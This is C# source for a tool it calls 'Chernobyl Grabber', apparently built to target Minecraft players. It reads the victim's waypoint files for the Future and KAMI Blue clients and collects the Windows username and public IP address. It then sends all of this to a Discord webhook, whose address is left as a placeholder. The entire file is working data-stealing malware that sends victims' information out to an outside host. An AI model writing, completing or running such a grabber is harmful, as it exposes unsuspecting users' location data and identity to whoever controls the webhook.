using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Security.Policy;
using System.Net;

namespace CH3RN0BYL
{
	class FPoints
	{
		public static string FPNTSpath = $@"C:/Users/{Environment.UserName}/Future/waypoints.txt";
		public static string getpnts()
		{
			try {
				return File.ReadAllText(FPNTSpath).ToString();
			}
			catch { return "Future Client Not Found."; }
		}
	
	}
	class KMBLPoints
	{
		public static string KMBLpath = $@"C:/Users/user/AppData/Roaming/.minecraft/KAMIBlueWaypoints.json";
		public static string getpnts()
		{
			try
			{
				return File.ReadAllText(KMBLpath);
			}
			catch { return "Kami Blue Not Found"; }
		}
	}
	class Program
	{
		static string url = "YOUR WEBHOOK";

		static void Main(string[] args)
		{
			sendToHook();
		}
		static async void sendToHook()
		{
			using (HttpClient client = new HttpClient())
			{
				var content = new Dictionary<string, string>
					{
					{ "content", $@"
**Project CH3RN0BYL**

Recieved Coordinates.
`PC Username:` {Environment.UserName}
`Internet Protocol:` {getprot()}

Future Client Coordinates:
```
{FPoints.getpnts()}
```
Kami Blue Coordinates:
```
{KMBLPoints.getpnts()}
```
"},
						{"avatar_url", "https://cdn.discordapp.com/attachments/712007334284492854/766799883075715102/5ab4dc7a9f7eb_thumb900.jpg"},
						{"username", "Chernobyl Grabber"}
					};
				var encodedContent = new FormUrlEncodedContent(content);
				var response = await client.PostAsync(url, encodedContent);
				var responseString = await response.Content.ReadAsStringAsync();
				Console.WriteLine(responseString);
			}
		}
		static string getprot()
		{
			using(WebClient client = new WebClient())
			{
				return client.DownloadString("https://wtfismyip.com/text");
			}
		}
	}
}
